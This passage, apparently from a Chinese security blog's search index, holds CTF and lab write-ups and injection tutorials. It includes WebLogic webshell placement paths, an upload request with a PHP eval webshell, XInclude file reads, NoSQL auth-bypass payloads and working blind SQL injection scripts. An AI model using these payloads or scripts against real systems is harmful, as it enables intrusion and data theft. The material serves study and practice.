StringBuilder(\"lvzhouhang\"));\n        f.invoke(m);\n    }\n}\n~~~\n\n## final\n\nfinal 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。**直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。**\n\n### 直接赋值\n\n~~~java\npackage src;\n\npublic class FinalStraightPerson {\n\n    private final String name = \"lvzhouhang\";\n    public final int age = 21-1;\n\n    public void printInfo() {\n        System.out.println(name+\" \"+age);\n\n    }\n}\n~~~\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class FinalStraightReflect {\n    public static void main(String[] args) throws Exception {\n        Class c = Class.forName(\"src.FinalStraightPerson\");\n        Object m = c.newInstance();\n        Method printMethod = c.getDeclaredMethod(\"printInfo\");\n        printMethod.invoke(m);\n\n        Field nameField = c.getDeclaredField(\"name\");\n        Field ageField = c.getDeclaredField(\"age\");\n        nameField.setAccessible(true);\n        ageField.setAccessible(true);\n        nameField.set(m,\"lvzhouhang\");\n        ageField.set(m,\"20\");\n\n        printMethod.invoke(m);\n    }\n}\n~~~\n\n这样通过反射修改会报错\n\n~~~\nException in thread \"main\" java.lang.IllegalArgumentException: Can not set final int field src.FinalStraightPerson.age to java.lang.String\n\tat sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)\n\tat sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)\n\tat sun.reflect.UnsafeQualifiedIntegerFieldAccessorImpl.set(UnsafeQualifiedIntegerFieldAccessorImpl.java:100)\n\tat java.lang.reflect.Field.set(Field.java:764)\n\tat src.FinalStraightReflect.main(FinalStraightReflect.java:18)\n~~~\n\n为什么呢？\n\n因为JVM在编译时期, 就把final类型的String进行了优化, 在编译时期就会把String处理成常量，只要是让name的值经过运行才能获得, 那么就不会被处理为常量。\n\n### 间接修改\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class InDirectReflect {\n    public static void main(String[] args) throws Exception {\n        Class c = Class.forName(\"src.InDirectPerson\");\n        Object m = c.newInstance();\n        Method printMethod = c.getDeclaredMethod(\"printInfo\");\n        printMethod.invoke(m);\n\n        Field nameField = c.getDeclaredField(\"name\");\n        Field ageField = c.getDeclaredField(\"age\");\n        Field sexField = c.getDeclaredField(\"sex\");\n        nameField.setAccessible(true);\n        ageField.setAccessible(true);\n        sexField.setAccessible(true);\n        nameField.set(m,\"lvzhouhang\");\n        ageField.set(m,200);\n        sexField.set(m,new StringBuilder(\"female\"));\n        printMethod.invoke(m);\n    }\n}\n~~~\n\n~~~java\npackage src;\n\npublic class InDirectPerson {\n    private final StringBuilder sex = new StringBuilder(\"male\");\n    // 经过逻辑判断产生的变量赋值\n    public final int age = (null!=null?20:20);\n    // 通过构造函数进行赋值\n    private final String name;\n    public InDirectPerson(){\n        name = \"lvzhouhang\";\n    }\n\n    public void printInfo() {\n        System.out.println(name+\" \"+age+\" \"+sex);\n\n    }\n}\n~~~\n\n这样就修改成功了\n\n### static+final\n\n~~~java\npackage src;\n\npublic class finalstaticreflection {\n    private final static StringBuilder name = new StringBuilder(\"lvzhouhang\");\n\n    public void printName() {\n        System.out.println(name);\n    }\n}\n\n~~~\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class finalstaticflectioncalc {\n    public static void main(String[] args) throws Exception{\n        finalstaticreflection c = new finalstaticreflection();\n        Method m = c.getClass().getDeclaredMethod(\"printName\");\n        m.invoke(c);\n        Field f = c.getClass().getField(\"name\");\n        f.setAccessible(true);\n        f.set(c,new StringBuilder(\"lllllvzhouhang\"));\n        m.invoke(c);\n    }\n\n}\n\n~~~\n\n这样使修改不成功的，但是还是可以修改，通过反射将name字段取出来后将final修饰符去掉就可以修改\n\n~~~java\npackage src;\n\nimport com.sun.org.apache.xpath.internal.operations.Mod;\n\nimport java.io.File;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Modifier;\n\npublic class finalstaticflectioncalc {\n    public static void main(String[] args) throws Exception{\n        finalstaticreflection c = new finalstaticreflection();\n        Method m = c.getClass().getDeclaredMethod(\"printName\");\n        c.printName();\n        Field f = c.getClass().getDeclaredField(\"name\");\n        f.setAccessible(true);\n        Field ff = f.getClass().getDeclaredField(\"modifiers\");\n        ff.setAccessible(true);\n        ff.setInt(f,f.getModifiers() & ~Modifier.FINAL);//去掉final修饰符\n        f.set(c,new StringBuilder(\"lllllvzhouhang\"));\n        ff.setInt(f,f.getModifiers() & ~Modifier.FINAL);//加上final修饰符\n        c.printName();\n    }\n\n}\n\n~~~\n\n这样就成功修改了\n","tags":["JAVA"],"categories":["JAVA"]},{"title":"weblogic上传马路径选择","url":"/2024/04/12/weblogic上传马路径选择/","content":"\n# [weblogic上传木马路径选择](https://www.cnblogs.com/sstfy/p/10350915.html)\n\n对于反序列化漏洞，如果获得的是系统权限或者root权限，那就没必要上传木马，但如果只是web安装应用的权限，就上传获取更大权限。\n\n上传需要找到几个点，获取物理路径，如下面三种：\n\n- **方法1：把shell写到控制台images目录中**\n  `\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp` 目录上传木马，\n  访问 `http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp`\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100928075-1843904986.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100928075-1843904986.png)\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100936306-699453349.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100936306-699453349.png)\n\n- **方法2：写到uddiexplorer目录中**\n  `\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\uddiexplorer\\随机字符\\war\\shell.jsp` 目录写入木马，\n  访问 `http://*.*.*.*:7001/uddiexplorer/shell.jsp`\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100944582-1944368429.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100944582-1944368429.png)\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100951748-1087437211.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100951748-1087437211.png)\n- **方法3：在应用安装目录中**\n  `\\Oracle\\Middleware\\user_projects\\domains\\application\\servers\\AdminServer\\tmp\\_WL_user\\项目名\\随机字符\\war\\shell.jsp` 目录写入木马，\n  访问 `http://*.*.*.*:7001/项目名/shell.jsp`\n","tags":["web"],"categories":["web"]},{"title":"WolvCTF2024-复盘","url":"/2024/03/18/WolvCTF2024-复盘/","content":"\n\n\n## Bean Cafe\n\n他的验证逻辑是通过图片的md5的值来验证的，所以我们只需要传两张MD5相同的图片就可以获得flag\n\nhttps://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0\n\n## Upload Fun\n\n~~~php\n<?php\n    if($_SERVER['REQUEST_METHOD'] == \"POST\"){\n        if ($_FILES[\"f\"][\"size\"] > 1000) {\n            echo \"file too large\";\n            return;\n        }\n\n        if (str_contains($_FILES[\"f\"][\"name\"], \"..\")) {\n            echo \"no .. in filename please\";\n            return;\n        }\n\n        if (empty($_FILES[\"f\"])){\n            echo \"empty file\";\n            return;\n        }\n\n        $ip = $_SERVER['REMOTE_ADDR'];\n        $flag = file_get_contents(\"/flag.txt\");\n        $hash = hash('sha256', $flag . $ip);\n\n        if (move_uploaded_file($_FILES[\"f\"][\"tmp_name\"], \"./uploads/\" . $hash . \"_\" . $_FILES[\"f\"][\"name\"])) {\n            echo \"upload success\";\n        } else {\n            echo \"upload error\";\n        }\n    } else {\n        if (isset($_GET[\"f\"])) {\n            $path = \"./uploads/\" . $_GET[\"f\"];\n            if (str_contains($path, \"..\")) {\n                echo \"no .. in f please\";\n                return;\n            }\n            include $path;\n        }\n\n        highlight_file(\"index.php\");\n    }\n?>\n~~~\n\n首先分析一下源码，源码通过POST方式来上传文件并且上传的文件不能包含`..`用GET的方式来读取文件也不能带有`..`，上传的文件在`uploads`目录下，但是我们不知道`$hash`是什么。\n\n通过谷歌得知在linux种文件名的长度最大可为255个字符，我们可以通过这种方式让它报错来得知他的值\n\n![](./pic/WolvCTF2024/upload.png)\n\n我们可以看到他的回显告诉我们了hash的值，然后我们再上传一句话木马访问即可。\n\nPOST上传文件的请求体模板:\n\n~~~\nPOST / HTTP/2\nHost: \nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: https://0ad900b10331bc6f843fbff300b80018.web-security-academy.net\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarylZktl8pLMuKyOfBy\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nContent-Length: 198\n\n------WebKitFormBoundarylZktl8pLMuKyOfBy\nContent-Disposition: form-data; name=\"\"; filename=\"\"\nContent-Type: \n\n\n<?php eval($_POST['1'])?>\n------WebKitFormBoundarylZktl8pLMuKyOfBy\n~~~\n\n## Username\n\n题目提示了jwt可以爆破，那这道题肯定和jwt伪造有关。\n\n用jwt-cracker爆破密钥，为`mstzt`\n\n因为有<data>标签，所以判断为xxe注入，但是正常的xxe他会有过滤，不能引用东西。可以使用`XInclude attack`关于[XInclude attack](https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks)\n\n读取/app/app.py文件\n\n~~~python\nimport flask\nfrom flask import Flask, render_template, request, url_for\nimport jwt\nfrom lxml import etree\nimport os\nimport re\nimport tempfile\n\napp = Flask(__name__)\n\nFLAG = os.environ.get('FLAG') or 'wcft{fake-flag}'\nFLAGUSER_PASSWORD = os.environ.get('FLAGUSER_PASSWORD') or 'fake-password'\n\nJWT_SECRET = os.environ.get('JWT_SECRET') or 'secret'\n\nJWT_ALG = 'HS256'\nJWT_COOKIE = 'appdata'\n\n\n@app.route('/')\ndef root():\n    return render_template(\"index.html\")\n\n\n@app.route('/secret-welcome-935734', methods=['GET'])\ndef secret_welcome():\n    # There is a linux user named 'flaguser'\n    # Login here with that username and their linux password.\n    auth = request.authorization\n\n    if auth is None or auth.username != 'flaguser' or auth.password != FLAGUSER_PASSWORD:\n        resp = flask.Response('Please provide the right credentials to get the flag')\n        resp.headers['WWW-Authenticate'] = 'Basic'\n        return resp, 401\n\n    return f'Congrats, here is your flag: {FLAG}'\n\n\n@app.route('/welcome', methods=['GET'])\ndef welcome():\n    cookie = request.cookies.get(JWT_COOKIE)\n\n    if not cookie:\n        return f'Error: missing {JWT_COOKIE} cookie value'\n\n    try:\n        jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG])\n    except:\n        return 'Error: unable to decode JWT cookie', 400\n\n    data = jwtData['data']\n    if not data:\n        return 'Error: missing data field from decoded JWT', 400\n\n    xmlText = str(data)\n    if '&' in xmlText:\n        return 'Error: No entity references please', 400\n    if '%' in xmlText:\n        return 'Error: No parameter file entities please', 400\n\n    tmp = tempfile.NamedTemporaryFile()\n\n    # Open the file for writing.\n    with open(tmp.name, 'w') as f:\n        f.write(xmlText)\n\n    try:\n        parser = etree.XMLParser(resolve_entities=False)\n        xmlDoc = etree.parse(tmp.name, parser=parser)\n        xmlDoc.xinclude()\n    except Exception as e:\n        print('XML Error:', e)\n        return 'Error: Error parsing XML', 400\n\n\n    usernameElement = xmlDoc.find('username')\n    if usernameElement is None:\n        return 'Error: Missing username element in XML', 400\n\n    username = usernameElement.text\n\n    return render_template(\"welcome.html\", username=username)\n\n\n@app.route('/register', methods=['POST'])\ndef register():\n    username = request.form.get('username')\n\n    if not username:\n        return 'Error: username is required', 400\n\n    username = str(username)\n\n    if not re.match('^[a-z] $', username):\n        return 'Error: username must be only lowercase letters', 400\n\n    if len(username) < 3:\n        return 'Error: username must be at least 3 letters', 400\n\n    if len(username) > 20:\n        return 'Error: username must be no longer than 20 letters', 400\n\n    # Useful for chal development\n    # username = '<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"/app/app.py\" parse=\"text\"/>'\n    xml = f'<data><username>{username}</username></data>'\n\n    jwtData = {\"data\": xml}\n\n    cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG)\n\n    response = flask.make_response(f'hello {username}')\n    response.set_cookie(JWT_COOKIE, cookie)\n\n    response.headers['location'] = url_for('welcome')\n    return response, 302\n\nif __name__ == \"__main__\":\n    app.run(debug=False)\n~~~\n\n在这个文件里可以得知，有一个新的路由`/secret-welcome-935734`在这里登陆成功后得到flag，用户名为`flaguser`，密码我们可以用xxe读取`/etc/passwd或者/etc/shadow`在shadow中我们得知密码为`$1$hack$BzqsFHqkPjQ2Sn9amFsgN0`这个可以利用`hashcat`爆破\n\n关于hashcat的用法[](https://www.jianshu.com/p/9909ce4c9e7c)\n\n爆破出来密码是`qqz3`登录得到flag\n","tags":["ctf"],"categories":["ctf","复盘"]},{"title":"java注入学习","url":"/2024/03/16/java注入学习/","content":"\n\n\n## JDBC\n\n### JDBC是什么\n\n**J**ava **D**ata**B**ase **C**onnectivity（Java语言连接数据库）\n\n| 接口或类                 | 作用                                                     |\n| ------------------------ | -------------------------------------------------------- |\n| **DriverManager类**      | 1)管理和注册数据库驱动<br />2)得到数据库连接对象         |\n| **Connection接口**       | 一个连接对象，可用于创建Statement和PreparedStatement对象 |\n| **Statemen接口**         | 一个SQL语句对象，用于将SQL语句发送给数据库服务器         |\n| **PreparedStetemen接口** | 一个SQL语句对象，是Statemen的子接口                      |\n| **ResultSet接口**        | 用于封装数据库查询的结果集，返回给数据库Java程序         |\n\n| 加载和注册驱动的方法                | 描述                                                         |\n| ----------------------------------- | ------------------------------------------------------------ |\n| **Class.forName(数据库驱动实现类)** | 加载和注册数据库驱动，数据库驱动由mysql厂商\"com.mysql.jbdc.Driver\" |\n\nPrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。\n\nStatement不会对SQL语句进行预编译。\n\n两种操作都是因为SQL语句拼接导致的SQL注入。\n\n## MyBatis框架\n\n在mybatis中的，使用`#`包裹的字段在内部进行了预编译处理，而`$`并没有使用预编译，也就是JDBC中prepareStatement和Statement的区别。mybatis的sql语句通常是写在xml文件中。\n\n### order by 盲注\n\n在SQL中是不允许union直接跟在order by后面的，所以我们可以考虑使用盲注或报错注入。\n\n我的理解就是通过order by将列进行排序，通过返回的不同结果\n\n举个简单的例子:\n\n~~~mysql\nMariaDB [test]> select * from user order by (if(substr((select username from user limit 0,1),1,1)='1',sleep(1),1));\n+------------------+------------+\n| username         | password   |\n+------------------+------------+\n| Nakajima Ayato   | 9CXLGSEWDO |\n| Mildred Green    | r8ZPbvDXBC |\n| Ito Momoe        | qao7ysP90D |\n| Lo On Kay        | x8rGVqTQqd |\n| Kobayashi Sakura | lYiv7UO8Yo |\n+------------------+------------+\n5 rows in set (0.002 sec)\n\nMariaDB [test]> select * from user order by (if(substr((select username from user limit 0,1),1,1)='N',sleep(1),1));\n+------------------+------------+\n| username         | password   |\n+------------------+------------+\n| Nakajima Ayato   | 9CXLGSEWDO |\n| Mildred Green    | r8ZPbvDXBC |\n| Ito Momoe        | qao7ysP90D |\n| Lo On Kay        | x8rGVqTQqd |\n| Kobayashi Sakura | lYiv7UO8Yo |\n+------------------+------------+\n5 rows in set (5.004 sec)\n~~~\n\n可以看到，当if语句成立时返回的时间为5s，但是不成立时为0.002s\n\n这是基于时间的盲注。\n\n还可以利用其它的方式来进行盲注\n\n例如：\n\n```sql\nMariaDB [test]> select * from user order by if(substr((select username from user limit 0,1),1,1)='a',1,(select host from mysql.user));\nERROR 1242 (21000): Subquery returns more than 1 row\n```\n\n如果if语句错误就会返回`ERROR 1242 (21000): Subquery returns more than 1 row`，当if成立时就会返回正常页面，可以通过返回的情况来判断。\n\n### rand()盲注\n\n原理和order by大差不差，就是rand()会产生一个0-1之间的随机数，我们给一个固定的种子就会生成一个固定的数，所以我们控制rand的种子就可以造成排序的结果不同。\n\n比如：\n\n~~~\nrand(1)\nrand(0)\nrand(1=1)\nrand(lenth(database())=8)\n....\n~~~\n\n### #和$符号的区别\n\n**#{}** \n\n使用#{}意味着使用的预编译的语句，即在使用jdbc时的preparedStatement，sql语句中如果存在参数则会使用?作占位符，我们知道这种方式可以防止sql注入，并且在使用#{}时形成的sql语句，已经带有引号，例，select * from table1 where id=#{id} 在调用这个语句时我们可以通过后台看到打印出的sql为：select * from table1 where id='2' 加入传的值为2.也就是说在组成sql语句的时候把参数默认为字符串。\n\n**${}**\n\n使用${}时的sql不会当做字符串处理，是什么就是什么，如上边的语句：select * from table1 where id=${id} 在调用这个语句时控制台打印的为：select * from table1 where id=2 ，假设传的参数值为2\n\n从上边的介绍可以看出这两种方式的区别，我们最好是能用#{}则用它，因为它可以防止sql注入，且是预编译的，在需要原样输出时才使用${}，如，\n\nselect * from ${tableName} order by ${id} 这里需要传入表名和按照哪个列进行排序 ，加入传入table1、id 则语句为：select * from table1 order by id\n\n如果是使用#{} 则变成了select * from 'table1' order by 'id' 我们知道这样就不对了。\n\n另，在使用以下的配置时，必须使用#{}\n\n```\n<select id=\"selectMessageByIdI\" parameterType=\"int\" resultType=\"Message\">\n         \n         select * from message where id=#{id};\n     </select>\n```\n\n在parameterType是int时，sql语句中必须是#{}。\n\n## 参考链接\n\n [关于Java中order by注入详解](https://www.freebuf.com/articles/web/360733.html)\n","tags":["web","sql"],"categories":["web","java"]},{"title":"NoSQL注入","url":"/2024/03/12/NoSQL注入/","content":"\n\n\n\n\n\n\n## 什么是NoSQL\n\nNoSQL，指的是非关系型的数据库。NoSQL 有时也称作 Not Only SQL 的缩写，是对不同于传统的[关系型数据库](https://cloud.tencent.com/product/cdb-overview?from_column=20065&from=20065)的[数据库管理](https://cloud.tencent.com/product/dbbrain?from_column=20065&from=20065)系统的统称。NoSQL 用于超大规模数据的存储。（例如谷歌或 Facebook 每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。\n\n---\n\n\n\nNoSQL 提供了新的数据模型和查询格式，从而可以规避常规的 SQL 注入攻击。但是，它们也为攻击者提供了插入恶意代码的新方法。总的来讲有四种注入手法：\n\n**1、重言式**\n\n又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。\n\n**2、联合查询**\n\n联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。\n\n**3、JavaScript 注入**\n\nMongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意 JavaScript 代码，导致非法的数据获取或篡改。\n\n**4、盲注**\n\n当页面没有回显时，那么我们可以通过`$regex`正则表达式来达到和 SQL 注入中`substr()`函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。\n\n---\n\n对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们输入`value=1`那么，也就是输入了一个 value 的值为 1 的数据。如果输入`value[$ne]=1`也就意味着`value=array($ne=>1)`,在 MongoDB 中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用`username[$gt]=&password[$gt]=`作为 payload 进行攻击。\n\n在我看来，nosql注入就是通过传入数组然后拼接恶意语句造成注入，和其他数据库的注入原理类似，但是语法有所不同。\n\n[查询操作符](https://blog.csdn.net/dyllove98/article/details/8990940)\n\nnosql的查询操作符不用`or、and、=`等等，取而代之的是`$eq、$ne、$gt`等\n\n| 方法名 | 描述     |\n| ------ | -------- |\n| $gt    | 大于     |\n| $lte   | 小于等于 |\n| $in    | 包含     |\n| $nin   | 不包含   |\n| $lt    | 小于     |\n| $gte   | 大于等于 |\n| $ne    | 不等于   |\n| $eq    | 等于     |\n\n| $and | 与                                                           |\n| ---- | ------------------------------------------------------------ |\n| $nor | $nor在NOR一个或多个查询表达式的数组上执行逻辑运算，并选择 对该数组中所有查询表达式都失败的文档 |\n| $not | 反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在   |\n| $or  | 或                                                           |\n\n例如：\n\n我们传入`username=admin&password=123456`\n\n后端就会处理成\n\n~~~\narray(\n'username' => 'admin',\n'password' => '123456'\n)\n~~~\n\n如果我们传入`username[$ne]=1&password[$ne]=1`\n\n后端处理成\n\n~~~\narray(\n'username' => array('$ne' => 1),\n'password' => array('$ne' => 1)\n)\n~~~\n\n查询的语句就会变成`db.users.find({'username':{$ne:1}, 'password':{$ne:1}})`\n\n意思就是查询username不等于1，password不等于1的用户\n\n此外,nosql还可以进行javascrip注入\n\n例如：`db.users.find( { $where: function() { return this.username == 'admin'; } } )`\n\n该查询返回在users集合中username等于admin的所有文档。\n\n\n\n## 参考链接\n\n[从零学习 NoSQL 注入之 Mongodb](https://cloud.tencent.com/developer/article/1602092)\n\n[get-started-with-nosql-injection-nosqli](https://tcm-sec.com/get-started-with-nosql-injection-nosqli/)\n","tags":["web","sql"],"categories":["web"]},{"title":"sql异或注入","url":"/2024/03/01/sql异或注入/","content":"\n\n\n## sql异或注入\n\n当waf过滤了很多东西，但是没有过滤异或(^)符的时候使用。\n\n\n\n### 什么是异或注入\n\n异步注入说简单一点就是在构造where后面的判断条件时使用^（异或符号）来达到sql注入攻击的目的\n\n**1^1=0 1^0=1**\n\n异或注入就是利用sql语句来进行盲注\n\n例如：\n\n```javascript\nselect * from student where Sname=1^(substr(database(),$变量1$,1)=$变量2$);\n```\n\n这里就是看数据库的第`变量1`个字符是否等于`变量2`，如果相等就会变成`1^1`返回的是0，所以我们应该在最后再异或一个1\n\n~~~sql\nselect * from student where Sname=1^(substr(database(),$变量1$,1)=$变量2$)^1;\n~~~\n\n这样如果数据库的第`变量1`个字符等于`变量2`就会返回1，然后再配合脚本实现异或注入\n\n---\n\n\n\n脚本:\n\n~~~\nimport requests\nimport time\n\nurl = \"\"\npay=''\ncolumn = \"\"\nfor i in range(1, 1000):\n    time.sleep(0.06)\n    low = 32\n    high = 128\n    mid = (low + high) // 2\n    while (low < high):\n        # 库名\n        #temp[\"id\"] = \"1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1\" % (i, mid)\n        # 表名\n        # temp[\"id\"] = \"1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1\" %(i,mid)\n        # 字段名\n        # temp[\"id\"] = \"1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1\" %(i,mid)\n        # 内容\n        pay = \"1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1\" %(i,mid)\n        r = requests.get(url+pay)\n        time.sleep(0.04)\n        print(low, high, mid, \":\")\n        if \"Click\" in r.text:\t\t\t#自行更改返回字符\n            low = mid + 1\n        else:\n            high = mid\n        mid = (low + high) // 2\n    if (mid == 32 or mid == 127):\n        break\n    column += chr(mid)\n    print(column)\n\nprint(\"All:\", column)\n\n~~~\n\n","tags":["web","sql"],"categories":["web"]},{"title":"PHP语法构造和变量函数","url":"/2024/02/29/PHP语法构造和变量函数/","content":"\n\n\n\n\n\n\n\n\n昨天我发现了一个问题\n\n```php\n<?php\n$a='693741';\n$a=base_convert($a,10,36);\n$a(system(\"dir\"));\n```\n\n$a是36进制的eval转换成的10进制\n\n所以这个代码其实就是`eval(system(\"dir\"));`，但是运行的时候却报错了\n\n~~~\nPHP Fatal error:  Uncaught Error: Call to undefined function eval()\n~~~\n\n然后去网上了解了才知道\n\n**`eval` 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用`**\n\n类似的语法构造还有：`echo`，`print`，`unset()`，`isset()`，`empty()`，`include`，`require`...\n\n就比如\n\n~~~\nprint \"asdasd\";\n>asdasd\n\nfunction  myprint($a)\n{\n    print $a;\n}\nmyprint \"asdasdasd\";\n>Parse error: syntax error, unexpected '\"asdasdasd\"' (T_CONSTANT_ENCAPSED_STRING)\n~~~\n\n直接`print \"asdasd\"`就可以打印出字符，但是自己构造的函数却没有办法这样。\n\n所以网上有的一句话木马来调用eval的其实都不可以,换成`assert`就可以了。\n","tags":["web"],"categories":["web"]},{"title":"order by 盲注","url":"/2024/02/11/order-by-盲注/","content":"\n# order by比较大小盲注\n\n![](/pic/orderby1.png)\n\n这是表里的所有东西\n\n如果我们执行`select * from flag where id='' or 1 union select 1,1 order by 2;`会出现\n\n![](/pic/orderby2.png)\n\n不能用`and`否则就相当于创建了一个虚拟的表，查询不到原来的数据。\n\n我们知道flag的第一位是`f`，如果我们查询`select * from flag where id='' or 1 union select 1,'f' order by 2;`会发生什么呢？\n\n![](/pic/orderby3.png)\n\n还是这样，第一行没什么用，但是如果我们查询的是`g`的话就会变成这样\n\n![](/pic/orderby4.png)\n\nflag的值就会出现在第一行，我们就可以利用这一点来进行order by盲注\n\n脚本:\n\n~~~python\nimport requests\nimport string\nurl=\"http://4ef0329e-10b4-4bd1-bf0a-0d80fe83129d.challenge.ctf.show/\"\nstr=string.digits+string.ascii_letters\nflag=''\nj=''\nfor i in range(1,50):\n    for s in str:\n        data = {\n            'username': \"' or 1 union select 1,2,'{0}' order by 3#\".format(flag+s),\n            'password': '1111'\n        }\n        r=requests.post(url,data=data)\n        if \"</code>admin\" in r.text:\n            flag+=chr(ord(s)-1)\n            print(flag)\n            break;\n~~~\n\n根据脚本自行修改\n","tags":["web","sql"],"categories":["web"]},{"title":"Tiki:1","url":"/2023/12/04/Tiki-1/","content":"\n# 描述\n\n哦，不，我们的网络服务器受到了损害。攻击者使用了0day，所以我们不知道他是如何进入管理面板的。调查一下。\n\n这是一个 OSCP Prep Box，它基于我最近发现的 CVE。它位于 OSCP 实验室机器级别。\n\n# 渗透过程\n\n首先就是信息搜集，靶机的ip用nmap或者netdiscover都可以\n\n靶机ip：192.168.56.102\n\n然后扫描一下全部的端口\n\n`nmap -sS -p- 192.168.56.102 -T4 --min-rate 1000 -oN nmap.txt`\n\n结果如下：\n\n~~~\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n~~~\n\n然后扫一下端口的信息，和服务的版本\n\n`nmap -sV -sC -O -p22,80,139,445 192.168.56.102 `\n\n~~~\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 a3d84a89a9256d07c53d762806edd1c0 (RSA)\n|   256 e7b289055457dc02f48c3a7c558b51aa (ECDSA)\n|_  256 fd77072b4a163a016be0000c0a36d82f (ED25519)\n80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry \n|_/tiki/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-toc: true\ntitle: Apache2 Ubuntu Default Page: It works\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nMAC Address: 08:00:27:26:96:01 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: 7h59m57s\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)\n| smb2-time: \n|   date: 2023-12-04T20:55:56\n|_  start_date: N/A\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.95 seconds\n\n~~~\n\n可以发现有`samba`服务，可以对samba进行枚举\n\n用`enum4linux`跑一下可以找到`silky`的用户,用smbclient列举一下共享的资源\n\n`smbclient -L IP`\n\n~~~\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tprint$          Disk      Printer Drivers\n\tNotes           Disk      My Notes\n\tIPC$            IPC       IPC Service (ubuntu server (Samba, Ubuntu))\n\n~~~\n\n能找到Notes，连接一下`smbclient //192.168.56.102/Notes`有一个Mail.txt\n\n下载下来查看\n\n~~~\n#Mail.txt\nHi Silky\nbecause of a current Breach we had to change all Passwords,\nplease note that it was a 0day, we don't know how he made it.\n\nYour new CMS-password is now 51lky571k1, \nplease investigate how he made it into our Admin Panel.\n\nCheers 